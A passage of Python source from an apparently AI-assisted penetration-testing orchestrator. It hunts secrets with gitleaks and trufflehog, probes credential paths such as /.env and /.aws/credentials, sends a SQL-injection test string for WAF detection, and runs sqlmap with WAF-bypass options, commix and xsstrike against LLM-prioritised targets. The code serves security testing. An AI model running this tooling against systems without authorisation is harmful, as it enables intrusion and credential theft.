                    f"gitleaks detect --source {self.output_dir} --report-path {self.output_dir}/gitleaks_{self.domain}.json --report-format json 2>/dev/null",
                    timeout=120
                )
                if ret == 0 or ret == 1:  # gitleaks returns 1 when secrets found
                    tools_run.append("gitleaks")
                    gitleaks_file = self.output_dir / f"gitleaks_{self.domain}.json"
                    if gitleaks_file.exists():
                        try:
                            gitleaks_data = json.loads(gitleaks_file.read_text())
                            for secret in gitleaks_data if isinstance(gitleaks_data, list) else []:
                                findings.append(Finding(
                                    type="secret_detected",
                                    value=secret.get("RuleID", "Unknown"),
                                    description=f"Secret detected: {secret.get('Description', secret.get('RuleID', 'Unknown secret'))}",
                                    severity="high" if "api" in secret.get("RuleID", "").lower() or "key" in secret.get("RuleID", "").lower() else "medium",
                                    phase="scan",
                                    tool="gitleaks",
                                    target=secret.get("File", self.target),
                                    metadata={
                                        "rule": secret.get("RuleID"),
                                        "file": secret.get("File"),
                                        "line": secret.get("StartLine"),
                                        "match": secret.get("Match", "")[:50] + "..." if len(secret.get("Match", "")) > 50 else secret.get("Match", "")
                                    }
                                ))
                        except (json.JSONDecodeError, FileNotFoundError):
                            pass
                    gitleaks_count = len([f for f in findings if f.tool == "gitleaks"])
                    self._log_tool(f"gitleaks - {gitleaks_count} secrets found", "done")
                else:
                    self._log_tool("gitleaks - not installed", "skip")
            except Exception as e:
                errors.append(f"Gitleaks error: {str(e)}")
                self._log_tool(f"gitleaks - error: {str(e)}", "error")

            # 12. TruffleHog - Deep Secret Scanning
            self._log_tool("trufflehog", "running")
            try:
                ret, trufflehog_output = await self._run_command(
                    f"trufflehog filesystem {self.output_dir} --json --only-verified 2>/dev/null > {self.output_dir}/trufflehog_{self.domain}.json",
                    timeout=180
                )
                if ret == 0:
                    tools_run.append("trufflehog")
                    trufflehog_file = self.output_dir / f"trufflehog_{self.domain}.json"
                    if trufflehog_file.exists() and trufflehog_file.stat().st_size > 0:
                        try:
                            # TruffleHog outputs JSONL (one JSON per line)
                            for line in trufflehog_file.read_text().strip().split("\n"):
                                if line.strip():
                                    secret = json.loads(line)
                                    findings.append(Finding(
                                        type="verified_secret",
                                        value=secret.get("DetectorName", "Unknown"),
                                        description=f"Verified secret: {secret.get('DetectorName', 'Unknown')} - {secret.get('DecoderName', '')}",
                                        severity="critical",  # Verified secrets are critical
                                        phase="scan",
                                        tool="trufflehog",
                                        target=secret.get("SourceMetadata", {}).get("Data", {}).get("Filesystem", {}).get("file", self.target),
                                        metadata={
                                            "detector": secret.get("DetectorName"),
                                            "verified": secret.get("Verified", False),
                                            "raw": secret.get("Raw", "")[:30] + "..." if len(secret.get("Raw", "")) > 30 else secret.get("Raw", "")
                                        }
                                    ))
                        except (json.JSONDecodeError, FileNotFoundError):
                            pass
                    trufflehog_count = len([f for f in findings if f.tool == "trufflehog"])
                    self._log_tool(f"trufflehog - {trufflehog_count} verified secrets", "done")
                else:
                    self._log_tool("trufflehog - not installed", "skip")
            except Exception as e:
                errors.append(f"TruffleHog error: {str(e)}")
                self._log_tool(f"trufflehog - error: {str(e)}", "error")

        # Add findings to global list
        for f in findings:
            self._add_finding(f)

        duration = time.time() - start_time
        result = PhaseResult(
            phase=phase,
            status="completed",
            started_at=started_at,
            finished_at=datetime.now(timezone.utc).isoformat(),
            duration=duration,
            findings=findings,
            tools_run=tools_run,
            errors=errors,
            metadata={
                "scan_ids": self.scan_ids
            }
        )

        self.phase_results[phase] = result
        if self.on_phase_complete:
            self.on_phase_complete(result)

        return result

    def _parse_nuclei_severity(self, line: str) -> str:
        """Parse severity from nuclei output line."""
        line_lower = line.lower()
        if "critical" in line_lower:
            return "critical"
        elif "high" in line_lower:
            return "high"
        elif "medium" in line_lower:
            return "medium"
        elif "low" in line_lower:
            return "low"
        return "info"

    def _map_wpscan_severity(self, severity: str) -> str:
        """Map WPScan severity to standard severity levels."""
        severity_map = {
            "critical": "critical",
            "high": "high",
            "medium": "medium",
            "low": "low",
            "info": "info",
            "informational": "info"
        }
        return severity_map.get(severity.lower(), "medium")

    # ==================== ANALYZE PHASE (Intelligence Module) ====================

    async def run_analyze(self) -> PhaseResult:
        """
        Execute intelligence analysis phase.

        This phase runs after SCAN to:
        1. Discover attack chains (vulnerability combinations)
        2. Prioritize findings by real-world exploitability
        3. Generate executive summary
        """
        phase = Phase.ANALYZE
        started_at = datetime.now(timezone.utc).isoformat()
        start_time = time.time()
        findings = []
        tools_run = []
        errors = []

        if self.on_phase_start:
            self.on_phase_start(phase)

        self._log_phase(phase, f"Intelligence Analysis for {self.domain}")

        if not self.config.enable_intelligence or not self._vuln_chainer:
            self._log_tool("Intelligence module disabled", "skip")
            duration = time.time() - start_time
            result = PhaseResult(
                phase=phase,
                status="skipped",
                started_at=started_at,
                finished_at=datetime.now(timezone.utc).isoformat(),
                duration=duration,
                findings=[],
                tools_run=[],
                errors=[],
                metadata={"reason": "Intelligence module disabled"}
            )
            self.phase_results[phase] = result
            return result

        # =====================================================================
        # 1. Vulnerability Chaining - Discover attack paths
        # =====================================================================
        self._log_tool("Vulnerability Chaining", "running")
        try:
            # Convert orchestrator findings to models.Finding format for intelligence modules
            from aipt_v2.models.findings import Finding as ModelsFinding, Severity as ModelsSeverity, VulnerabilityType

            models_findings = []
            for f in self.findings:
                try:
                    # Map severity string to enum
                    severity_map = {
                        "critical": ModelsSeverity.CRITICAL,
                        "high": ModelsSeverity.HIGH,
                        "medium": ModelsSeverity.MEDIUM,
                        "low": ModelsSeverity.LOW,
                        "info": ModelsSeverity.INFO,
                        "informational": ModelsSeverity.INFO,
                    }
                    severity = severity_map.get(f.severity.lower(), ModelsSeverity.INFO)

                    # Map finding type to vulnerability type
                    vuln_type_map = {
                        "sqli": VulnerabilityType.SQL_INJECTION,
                        "sql_injection": VulnerabilityType.SQL_INJECTION,
                        "xss": VulnerabilityType.XSS_REFLECTED,
                        "xss_stored": VulnerabilityType.XSS_STORED,
                        "xss_reflected": VulnerabilityType.XSS_REFLECTED,
                        "ssrf": VulnerabilityType.SSRF,
                        "rce": VulnerabilityType.RCE,
                        "lfi": VulnerabilityType.FILE_INCLUSION,
                        "file_inclusion": VulnerabilityType.FILE_INCLUSION,
                        "open_redirect": VulnerabilityType.OPEN_REDIRECT,
                        "csrf": VulnerabilityType.CSRF,
                        "idor": VulnerabilityType.BROKEN_ACCESS_CONTROL,
                        "info_disclosure": VulnerabilityType.INFORMATION_DISCLOSURE,
                        "information_disclosure": VulnerabilityType.INFORMATION_DISCLOSURE,
                        "misconfig": VulnerabilityType.SECURITY_MISCONFIGURATION,
                        "misconfiguration": VulnerabilityType.SECURITY_MISCONFIGURATION,
                    }
                    vuln_type = vuln_type_map.get(f.type.lower(), VulnerabilityType.OTHER)

                    models_findings.append(ModelsFinding(
                        title=f.value,
                        severity=severity,
                        vuln_type=vuln_type,
                        url=f.target or self.target,
                        description=f.description,
                        source=f.tool,
                    ))
                except Exception as conv_err:
                    logger.debug(f"Could not convert finding for chaining: {conv_err}")
                    continue

            chains = self._vuln_chainer.find_chains(models_findings)
            self.attack_chains = chains

            if chains:
                tools_run.append("vulnerability_chainer")
                self._log_tool(f"Vulnerability Chaining - {len(chains)} attack chains discovered", "done")

                # Log critical chains
                for chain in chains:
                    if chain.max_impact == "Critical":
                        logger.warning(f"CRITICAL CHAIN: {chain.title} - {chain.impact_description}")

                        # Add as finding
                        findings.append(Finding(
                            type="attack_chain",
                            value=chain.title,
                            description=chain.impact_description,
                            severity="critical",
                            phase="analyze",
                            tool="vulnerability_chainer",
                            target=self.domain,
                            metadata={
                                "chain_id": chain.chain_id,
                                "steps": len(chain.links),
                                "vulnerabilities": [link.finding.get("title", "") for link in chain.links]
                            }
                        ))

                    # Notify callback
                    if self.on_chain_discovered:
                        self.on_chain_discovered(chain)

                # Save chains to file
                chains_data = [c.to_dict() for c in chains]
                (self.output_dir / "attack_chains.json").write_text(json.dumps(chains_data, indent=2), encoding="utf-8")
            else:
                self._log_tool("Vulnerability Chaining - No chains found", "done")

        except Exception as e:
            errors.append(f"Chaining error: {str(e)}")
            self._log_tool(f"Vulnerability Chaining - Error: {e}", "error")

        # =====================================================================
        # 2. AI-Powered Triage - Prioritize by exploitability
        # =====================================================================
        self._log_tool("AI Triage", "running")
        try:
            # Reuse models_findings from chaining if available, otherwise convert now
            if not models_findings:
                from aipt_v2.models.findings import Finding as ModelsFinding, Severity as ModelsSeverity, VulnerabilityType
                models_findings = []
                for f in self.findings:
                    try:
                        severity_map = {
                            "critical": ModelsSeverity.CRITICAL,
                            "high": ModelsSeverity.HIGH,
                            "medium": ModelsSeverity.MEDIUM,
                            "low": ModelsSeverity.LOW,
                            "info": ModelsSeverity.INFO,
                        }
                        severity = severity_map.get(f.severity.lower(), ModelsSeverity.INFO)
                        # Bug fix: Use _get_finding_title() instead of raw f.value
                        # f.value can be a number (e.g., "0" for subdomain_count)
                        finding_title = self._get_finding_title(f)
                        models_findings.append(ModelsFinding(
                            title=finding_title,
                            severity=severity,
                            vuln_type=VulnerabilityType.OTHER,
                            url=f.target or self.target,
                            description=f.description,
                            source=f.tool,
                        ))
                    except Exception:
                        continue

            # Call the analyze() method (not triage())
            triage_result = await self._ai_triage.analyze(models_findings)
            self.triage_result = triage_result

            tools_run.append("ai_triage")

            # Save triage results
            (self.output_dir / "triage_result.json").write_text(
                json.dumps(triage_result.to_dict(), indent=2), encoding="utf-8"
            )

            # Save executive summary
            (self.output_dir / "EXECUTIVE_SUMMARY.md").write_text(triage_result.executive_summary, encoding="utf-8")

            # Log top priorities using get_top_priority() method
            top_assessments = triage_result.get_top_priority(3)
            if top_assessments:
                top_titles = [a.finding.title for a in top_assessments]
                self._log_tool(f"AI Triage - Top priorities: {', '.join(top_titles)}", "done")
            else:
                self._log_tool("AI Triage - No high-priority findings", "done")

        except Exception as e:
            errors.append(f"Triage error: {str(e)}")
            self._log_tool(f"AI Triage - Error: {e}", "error")

        # =====================================================================
        # 3. Scope Audit - Check for violations
        # =====================================================================
        if self._scope_enforcer:
            self._log_tool("Scope Audit", "running")
            violations = self._scope_enforcer.get_violations()
            if violations:
                self._log_tool(f"Scope Audit - {len(violations)} violations detected!", "done")
                # Save audit log
                audit_log = self._scope_enforcer.get_audit_log()
                (self.output_dir / "scope_audit.json").write_text(json.dumps(audit_log, indent=2), encoding="utf-8")
            else:
                self._log_tool("Scope Audit - All requests within scope", "done")
            tools_run.append("scope_audit")

        # Add findings to global list
        for f in findings:
            self._add_finding(f)

        duration = time.time() - start_time
        result = PhaseResult(
            phase=phase,
            status="completed",
            started_at=started_at,
            finished_at=datetime.now(timezone.utc).isoformat(),
            duration=duration,
            findings=findings,
            tools_run=tools_run,
            errors=errors,
            metadata={
                "attack_chains_count": len(self.attack_chains),
                "top_priorities_count": len(self.triage_result.get_top_priority(10)) if self.triage_result else 0,
                "scope_violations": len(self._scope_enforcer.get_violations()) if self._scope_enforcer else 0
            }
        )

        self.phase_results[phase] = result
        if self.on_phase_complete:
            self.on_phase_complete(result)

        return result

    # ==================== EXPLOIT PHASE ====================

    async def run_exploit(self) -> PhaseResult:
        """Execute exploitation/validation phase."""
        phase = Phase.EXPLOIT
        started_at = datetime.now(timezone.utc).isoformat()
        start_time = time.time()
        findings = []
        tools_run = []
        errors = []

        if self.on_phase_start:
            self.on_phase_start(phase)

        self._log_phase(phase, f"Vulnerability Validation on {self.domain}")

        # 1. Check Sensitive Endpoints (with false positive reduction)
        if self.config.check_sensitive_paths:
            self._log_tool("Sensitive Path Check", "running")

            # First, get baseline response for a known non-existent path
            # This helps detect custom 404 pages that return 200
            baseline_path = f"/aiptx_nonexistent_{int(time.time())}_test"
            ret, baseline_info = await self._run_command(
                f"curl -s -w '\\n%{{http_code}}\\n%{{size_download}}' '{self.target}{baseline_path}' --connect-timeout 5 | tail -2",
                timeout=10
            )
            baseline_status = "404"
            baseline_size = 0
            if ret == 0:
                parts = baseline_info.strip().split('\n')
                if len(parts) >= 2:
                    baseline_status = parts[0].strip()
                    try:
                        baseline_size = int(parts[1].strip())
                    except ValueError:
                        baseline_size = 0

            # Sensitive paths with their expected content patterns for validation
            sensitive_paths = {
                # Path: (severity, content_patterns_to_validate)
                "/.env": ("critical", ["DB_PASSWORD", "API_KEY", "SECRET", "AWS_", "DATABASE_URL"]),
                "/.git/config": ("critical", ["[core]", "[remote", "repositoryformatversion"]),
                "/.aws/credentials": ("critical", ["aws_access_key_id", "aws_secret_access_key"]),
                "/actuator/env": ("high", ["activeProfiles", "propertySources", "systemProperties"]),
                "/actuator/health": ("medium", ['"status"', "UP", "DOWN"]),
                "/actuator": ("medium", ["_links", "actuator"]),
                "/metrics": ("medium", ["counter", "gauge", "histogram", "process_"]),
                "/swagger-ui.html": ("low", ["swagger", "api-docs", "Swagger UI"]),
                "/api/swagger": ("low", ["swagger", "openapi", "paths"]),
                "/graphql": ("medium", ["__schema", "queryType", "mutationType"]),
                "/phpinfo.php": ("high", ["PHP Version", "phpinfo()", "Configuration"]),
                "/server-status": ("medium", ["Apache Server Status", "Server Version"]),
                "/debug": ("medium", ["debug", "trace", "stack"]),
                "/admin": ("low", ["admin", "login", "dashboard"]),
                "/backup": ("medium", ["backup", "sql", "dump"]),
            }

            validated_findings = 0
            for path, (severity, patterns) in sensitive_paths.items():
                try:
                    # Get both status code and response body
                    ret, response = await self._run_command(
                        f"curl -s -w '\\n---HTTP_CODE---%{{http_code}}---SIZE---%{{size_download}}' '{self.target}{path}' --connect-timeout 5 2>/dev/null",
                        timeout=15
                    )
                    if ret != 0:
                        continue

                    # Parse response
                    if "---HTTP_CODE---" in response:
                        parts = response.rsplit("---HTTP_CODE---", 1)
                        body = parts[0] if len(parts) > 1 else ""
                        meta = parts[1] if len(parts) > 1 else ""

                        status_code = ""
                        response_size = 0
                        if "---SIZE---" in meta:
                            meta_parts = meta.split("---SIZE---")
                            status_code = meta_parts[0].strip()
                            try:
                                response_size = int(meta_parts[1].strip())
                            except ValueError:
                                response_size = len(body)
                    else:
                        body = response
                        status_code = "200"
                        response_size = len(body)

                    # Skip if not a success response
                    if status_code not in ["200", "301", "302"]:
                        continue

                    # False positive check 1: Same status as baseline non-existent path
                    if status_code == baseline_status and abs(response_size - baseline_size) < 100:
                        continue  # Likely a custom 404 page

                    # False positive check 2: Response too small (likely error page)
                    if response_size < 50:
                        continue

                    # Validate by checking for expected content patterns
                    is_valid = False
                    matched_pattern = None
                    for pattern in patterns:
                        if pattern.lower() in body.lower():
                            is_valid = True
                            matched_pattern = pattern
                            break

                    if is_valid:
                        validated_findings += 1
                        findings.append(Finding(
                            type="exposed_endpoint",
                            value=f"{self.target}{path}",
                            description=f"VALIDATED: Sensitive endpoint '{path}' exposes data (matched: '{matched_pattern}')",
                            severity=severity,
                            phase="exploit",
                            tool="path_check",
                            target=self.target,
                            metadata={
                                "http_status": status_code,
                                "response_size": response_size,
                                "matched_pattern": matched_pattern,
                                "validated": True
                            }
                        ))
                    elif status_code == "200" and response_size > 500:
                        # Large 200 response without pattern match - might still be interesting
                        # Add as info-level for manual review
                        findings.append(Finding(
                            type="potential_exposure",
                            value=f"{self.target}{path}",
                            description=f"Endpoint '{path}' returns content (HTTP {status_code}, {response_size} bytes) - needs manual review",
                            severity="info",
                            phase="exploit",
                            tool="path_check",
                            target=self.target,
                            metadata={
                                "http_status": status_code,
                                "response_size": response_size,
                                "validated": False,
                                "reason": "No sensitive pattern matched"
                            }
                        ))

                except Exception as e:
                    logger.debug(f"Error checking {path}: {e}")
                    continue

            tools_run.append("sensitive_path_check")
            total_checked = len([f for f in findings if f.tool == "path_check"])
            self._log_tool(f"Sensitive Path Check - {validated_findings} validated, {total_checked - validated_findings} potential", "done")

        # 2. WAF Detection
        self._log_tool("WAF Detection", "running")
        ret, output = await self._run_command(
            f"curl -sI \"{self.target}/?id=1'%20OR%20'1'='1\" --connect-timeout 5 | head -1",
            timeout=10
        )
        waf_detected = "403" in output or "406" in output or "429" in output
        (self.output_dir / "waf_test.txt").write_text(f"WAF Test Response: {output}\nWAF Detected: {waf_detected}", encoding="utf-8")
        tools_run.append("waf_detection")

        if not waf_detected:
            findings.append(Finding(
                type="waf_bypass",
                value="No WAF detected",
                description="Target does not appear to have a WAF or WAF is not blocking",
                severity="low",
                phase="exploit",
                tool="waf_detection",
                target=self.target
            ))
        self._log_tool(f"WAF Detection - {'Detected' if waf_detected else 'Not detected'}", "done")

        # ==================== LLM ATTACK SURFACE ANALYSIS ====================
        # Use LLM to intelligently analyze crawler discoveries and prioritize attacks
        crawler_analysis = None
        if self.discovered_endpoints or self.discovered_forms or self.discovered_parameters:
            self._log_tool("LLM Attack Surface Analysis", "running")
            try:
                from aipt_v2.intelligence.llm_crawler_analyzer import LLMCrawlerAnalyzer

                # Detect technology stack from findings/headers
                tech_stack = []
                for f in self.findings:
                    if f.type == "technology_detected" and f.value:
                        tech_stack.append(f.value)

                analyzer = LLMCrawlerAnalyzer()
                crawler_analysis = await analyzer.analyze_attack_surface(
                    endpoints=self.discovered_endpoints,
                    forms=self.discovered_forms,
                    parameters=self.discovered_parameters,
                    target=self.target,
                    tech_stack=tech_stack,
                )

                # Store analysis for use by exploitation tools
                self._crawler_analysis = crawler_analysis

                # Save analysis results
                analysis_output = {
                    "target": self.target,
                    "analyzed_at": crawler_analysis.analyzed_at.isoformat(),
                    "llm_model": crawler_analysis.llm_model,
                    "high_priority_parameters": [p.to_dict() for p in crawler_analysis.high_priority_parameters],
                    "high_priority_forms": [f.to_dict() for f in crawler_analysis.high_priority_forms],
                    "attack_chains": [c.to_dict() for c in crawler_analysis.attack_chains],
                    "endpoint_categories": crawler_analysis.endpoint_categories,
                    "recommended_tool_order": crawler_analysis.recommended_tool_order,
                    "attack_surface_summary": crawler_analysis.attack_surface_summary,
                }
                (self.output_dir / "llm_attack_analysis.json").write_text(
                    json.dumps(analysis_output, indent=2, default=str)
                )

                # Log summary
                sqli_targets = len(crawler_analysis.get_sqli_targets())
                idor_targets = len(crawler_analysis.get_idor_targets())
                login_forms = len(crawler_analysis.get_login_forms())
                upload_forms = len(crawler_analysis.get_upload_forms())

                summary = f"LLM Analysis - {len(crawler_analysis.high_priority_parameters)} priority params"
                if sqli_targets:
                    summary += f", {sqli_targets} SQLi targets"
                if idor_targets:
                    summary += f", {idor_targets} IDOR targets"
                if login_forms:
                    summary += f", {login_forms} login forms"
                if upload_forms:
                    summary += f", {upload_forms} upload forms"

                tools_run.append("llm_attack_analysis")
                self._log_tool(summary, "done")

                # Add finding for attack surface analysis
                findings.append(Finding(
                    type="attack_surface_analysis",
                    value=f"{len(crawler_analysis.high_priority_parameters)} high-priority parameters identified",
                    description=crawler_analysis.attack_surface_summary or f"LLM identified {sqli_targets} SQLi, {idor_targets} IDOR, {login_forms} login, {upload_forms} upload targets",
                    severity="info",
                    phase="exploit",
                    tool="llm_crawler_analyzer",
                    target=self.target,
                    metadata={
                        "sqli_targets": sqli_targets,
                        "idor_targets": idor_targets,
                        "login_forms": login_forms,
                        "upload_forms": upload_forms,
                        "recommended_tools": crawler_analysis.recommended_tool_order,
                    }
                ))

            except Exception as e:
                logger.warning(f"LLM Attack Surface Analysis failed: {e}")
                self._log_tool("LLM Attack Analysis - skipped (LLM unavailable)", "skip")

        # ==================== EXPLOITATION TOOLS (Enabled in full_mode) ====================
        if self.config.full_mode or self.config.enable_exploitation:

            # 3. SQLMap - SQL Injection Testing (Enhanced with Crawler Discovery + WAF Bypass)
            if "sqlmap" in self.config.exploit_tools:
                self._log_tool("sqlmap", "running")
                sqlmap_output_dir = self.output_dir / "sqlmap"
                sqlmap_output_dir.mkdir(exist_ok=True)

                all_sqlmap_output = []
                vuln_params = []
                tested_count = 0

                # Get WAF bypass arguments if WAF was detected
                waf_bypass_args = self._get_waf_bypass_sqlmap_args()
                if waf_bypass_args:
                    self._log_tool("sqlmap - WAF detected, applying bypass techniques", "running")

                # Build list of URLs to test - prioritize LLM-identified SQLi targets
                urls_to_test = []

                def ensure_full_url(url: str) -> str:
                    """Ensure URL has proper scheme."""
                    if not url:
                        return self.target
                    if not url.startswith(("http://", "https://")):
                        if url.startswith("/"):
                            return f"{self.target.rstrip('/')}{url}"
                        else:
                            return f"https://{url}"
                    return url

                # PRIORITY 1: Use LLM-identified SQLi targets (highest confidence)
                if crawler_analysis:
                    sqli_targets = crawler_analysis.get_sqli_targets()
                    if sqli_targets:
                        self._log_tool(f"sqlmap - LLM identified {len(sqli_targets)} SQLi targets", "running")
                        for target in sqli_targets:
                            full_url = ensure_full_url(target.url)
                            if full_url and self.domain in full_url:
                                # Build URL with parameter
                                if '?' not in full_url and target.name:
                                    full_url = f"{full_url}?{target.name}=test"
                                urls_to_test.append(full_url)

                # PRIORITY 2: Add discovered endpoints with query parameters
                for endpoint in self.discovered_endpoints:
                    if '?' in endpoint and '=' in endpoint:
                        full_url = ensure_full_url(endpoint)
                        if full_url and self.domain in full_url and full_url not in urls_to_test:
                            urls_to_test.append(full_url)

                # PRIORITY 3: Add form actions with POST data
                for form in self.discovered_forms:
                    if form.get('method', '').upper() == 'POST' and form.get('inputs'):
                        action = form.get('action', self.target)
                        full_url = ensure_full_url(action)
                        if not full_url or self.domain not in full_url:
                            continue
                        # Build data string from form inputs
                        data_parts = []
                        for inp in form.get('inputs', []):
                            if inp.get('name'):
                                data_parts.append(f"{inp['name']}=test")
                        if data_parts:
                            urls_to_test.append((full_url, '&'.join(data_parts)))

                # PRIORITY 4: Fall back to root URL with crawling if no discoveries
                if not urls_to_test:
                    urls_to_test.append(self.target)

                self._log_tool(f"sqlmap - testing {len(urls_to_test)} targets", "running")

                # Test each URL (limit to prevent excessive scanning)
                max_urls = 20  # Limit to avoid long scan times
                for i, url_entry in enumerate(urls_to_test[:max_urls]):
                    if isinstance(url_entry, tuple):
                        # POST form with data
                        url, data = url_entry
                        cmd = (
                            f"sqlmap -u {shlex.quote(url)} --data={shlex.quote(data)} "
                            f"--batch --level={self.config.sqlmap_level} --risk={self.config.sqlmap_risk} "
                            f"--output-dir={sqlmap_output_dir} --threads=4 {waf_bypass_args} 2>/dev/null"
                        )
                    elif '?' in str(url_entry):
                        # GET with parameters
                        cmd = (
                            f"sqlmap -u {shlex.quote(url_entry)} "
                            f"--batch --level={self.config.sqlmap_level} --risk={self.config.sqlmap_risk} "
                            f"--output-dir={sqlmap_output_dir} --threads=4 {waf_bypass_args} 2>/dev/null"
                        )
                    else:
                        # Root URL - use forms and crawl
                        # --batch auto-accepts, --threads avoids prompt, --answers pre-answers remaining questions
                        cmd = (
                            f"sqlmap -u {shlex.quote(url_entry)} --batch --forms --crawl=2 "
                            f"--level={self.config.sqlmap_level} --risk={self.config.sqlmap_risk} "
                            f"--output-dir={sqlmap_output_dir} --threads=4 "
                            f"--answers='sitemap=N,threads=4' {waf_bypass_args} 2>/dev/null"
                        )

                    ret, output = await self._run_command(cmd, timeout=self.config.sqlmap_timeout // max(1, len(urls_to_test[:max_urls])))
                    tested_count += 1

                    if ret == 0 and output:
                        all_sqlmap_output.append(output)

                        # Parse SQLMap findings
                        if "is vulnerable" in output.lower() or "injection" in output.lower():
                            for line in output.split("\n"):
                                if "Parameter:" in line or "is vulnerable" in line:
                                    vuln_params.append(line.strip())

                            # Record the finding
                            target_url = url_entry[0] if isinstance(url_entry, tuple) else url_entry
                            findings.append(Finding(
                                type="sql_injection",
                                value="SQL Injection Detected",
                                description=f"SQL injection vulnerability at {target_url}",
                                severity="critical",
                                phase="exploit",
                                tool="sqlmap",
                                target=target_url,
                                metadata={"vulnerable_params": vuln_params[-5:]}
                            ))

                            # Mark shell access if OS shell was obtained
                            if "--os-shell" in output or "os-shell" in output:
                                self.config.shell_obtained = True
                                self.config.target_os = "linux" if "linux" in output.lower() else "windows"

                # Save combined output
                if all_sqlmap_output:
                    (self.output_dir / f"sqlmap_{self.domain}.txt").write_text("\n\n".join(all_sqlmap_output))
                    tools_run.append("sqlmap")

                self._log_tool(
                    f"sqlmap - tested {tested_count} URLs, {'VULNERABLE!' if vuln_params else 'no injection found'}",
                    "done"
                )

            # 4. Commix - Command Injection Testing (Enhanced with LLM Analysis)
            if "commix" in self.config.exploit_tools:
                self._log_tool("commix", "running")

                all_commix_output = []
                tested_count = 0
                vuln_found = False
                tested_urls = set()  # Track to avoid duplicates

                # Build list of URLs to test - skip static resources
                urls_to_test = []

                def is_static_resource(url: str) -> bool:
                    """Skip static resources that won't have command injection."""
                    static_extensions = ['.css', '.js', '.png', '.jpg', '.jpeg', '.gif', '.ico', '.woff', '.woff2', '.ttf', '.svg', '.map']
                    path = url.lower().split('?')[0]
                    return any(path.endswith(ext) for ext in static_extensions)

                def ensure_full_url(url: str) -> str:
                    """Ensure URL has proper scheme."""
                    if not url:
                        return self.target
                    if not url.startswith(("http://", "https://")):
                        if url.startswith("/"):
                            return f"{self.target.rstrip('/')}{url}"
                        else:
                            return f"https://{url}"
                    return url

                # 1. Add discovered endpoints with query parameters (exclude static)
                for endpoint in self.discovered_endpoints:
                    if '?' in endpoint and '=' in endpoint and not is_static_resource(endpoint):
                        full_url = ensure_full_url(endpoint)
                        if full_url and self.domain in full_url and full_url not in tested_urls:
                            urls_to_test.append(full_url)
                            tested_urls.add(full_url)

                # 2. Add form actions with POST data (command injection via forms)
                for form in self.discovered_forms:
                    if form.get('method', '').upper() == 'POST' and form.get('inputs'):
                        action = form.get('action', self.target)
                        full_url = ensure_full_url(action)
                        if full_url and self.domain in full_url and not is_static_resource(full_url):
                            data_parts = []
                            for inp in form.get('inputs', []):
                                if inp.get('name'):
                                    data_parts.append(f"{inp['name']}=test")
                            if data_parts and full_url not in tested_urls:
                                urls_to_test.append((full_url, '&'.join(data_parts)))
                                tested_urls.add(full_url)

                # 3. Fall back to root URL with crawling
                if not urls_to_test:
                    urls_to_test.append(self.target)

                self._log_tool(f"commix - testing {len(urls_to_test)} targets", "running")

                max_urls = 10  # Limit for Commix (slower tool)
                for url_entry in urls_to_test[:max_urls]:
                    if isinstance(url_entry, tuple):
                        url, data = url_entry
                        cmd = f"commix -u {shlex.quote(url)} --data={shlex.quote(data)} --batch --level=2 2>/dev/null"
                    elif '?' in str(url_entry):
                        cmd = f"commix -u {shlex.quote(url_entry)} --batch --level=2 2>/dev/null"
                    else:
                        cmd = f"commix -u {shlex.quote(url_entry)} --batch --crawl=1 --level=2 2>/dev/null"

                    ret, output = await self._run_command(cmd, timeout=180)
                    tested_count += 1

                    if ret == 0 and output:
                        all_commix_output.append(output)

                        if "is vulnerable" in output.lower() or "command injection" in output.lower():
                            target_url = url_entry[0] if isinstance(url_entry, tuple) else url_entry
                            findings.append(Finding(
                                type="command_injection",
                                value="Command Injection Detected",
                                description=f"OS command injection vulnerability at {target_url}",
                                severity="critical",
                                phase="exploit",
                                tool="commix",
                                target=target_url
                            ))
                            self.config.shell_obtained = True
                            vuln_found = True

                # Save combined output
                if all_commix_output:
                    (self.output_dir / f"commix_{self.domain}.txt").write_text("\n\n".join(all_commix_output))
                    tools_run.append("commix")

                self._log_tool(
                    f"commix - tested {tested_count} URLs, {'VULNERABLE!' if vuln_found else 'no injection found'}",
                    "done"
                )

            # 5. XSStrike - XSS Detection (Enhanced with LLM Analysis)
            if "xsstrike" in self.config.exploit_tools:
                self._log_tool("xsstrike", "running")

                all_xsstrike_output = []
                total_xss_count = 0
                tested_count = 0

                # Build list of URLs to test - prioritize LLM-identified XSS targets
                urls_to_test = []
                tested_urls = set()  # Track to avoid duplicates

                def ensure_full_url(url: str) -> str:
                    """Ensure URL has proper scheme."""
                    if not url:
                        return self.target
                    if not url.startswith(("http://", "https://")):
                        if url.startswith("/"):
                            return f"{self.target.rstrip('/')}{url}"
                        else:
                            return f"https://{url}"
                    return url

                def is_static_resource(url: str) -> bool:
                    """Skip static resources that won't have XSS."""
                    static_extensions = ['.css', '.js', '.png', '.jpg', '.jpeg', '.gif', '.ico', '.woff', '.woff2', '.ttf', '.svg', '.map']
                    path = url.lower().split('?')[0]
                    return any(path.endswith(ext) for ext in static_extensions)

                # PRIORITY 1: Use LLM-identified XSS targets (highest confidence)
                if crawler_analysis:
                    xss_targets = crawler_analysis.get_xss_targets()
                    if xss_targets:
                        self._log_tool(f"xsstrike - LLM identified {len(xss_targets)} XSS targets", "running")
                        for target in xss_targets:
                            full_url = ensure_full_url(target.url)
                            if full_url and self.domain in full_url and not is_static_resource(full_url):
                                # Build URL with parameter
                                if '?' not in full_url and target.name:
                                    full_url = f"{full_url}?{target.name}=test"
                                if full_url not in tested_urls:
                                    urls_to_test.append(full_url)
                                    tested_urls.add(full_url)

                    # Also add search forms (common XSS targets)
                    search_forms = crawler_analysis.get_search_forms()
                    for form in search_forms:
                        full_url = ensure_full_url(form.action)
                        if full_url and self.domain in full_url and full_url not in tested_urls:
                            urls_to_test.append(full_url)
                            tested_urls.add(full_url)

                # PRIORITY 2: Add discovered endpoints with query parameters (exclude static resources)
                for endpoint in self.discovered_endpoints:
                    if '?' in endpoint and '=' in endpoint and not is_static_resource(endpoint):
                        full_url = ensure_full_url(endpoint)
                        if full_url and self.domain in full_url and full_url not in tested_urls:
                            urls_to_test.append(full_url)
                            tested_urls.add(full_url)

                # PRIORITY 3: Add form actions (XSS in form inputs) - exclude static
                for form in self.discovered_forms:
                    action = form.get('action', self.target)
                    full_url = ensure_full_url(action)
                    if full_url and self.domain in full_url and full_url not in tested_urls and not is_static_resource(full_url):
                        urls_to_test.append(full_url)
                        tested_urls.add(full_url)

                # PRIORITY 4: Fall back to root URL with crawling if no discoveries
                if not urls_to_test:
                    urls_to_test.append(self.target)

                self._log_tool(f"xsstrike - testing {len(urls_to_test)} targets", "running")

                # Test each URL (limit to prevent excessive scanning)
                max_urls = 15  # Limit for XSStrike
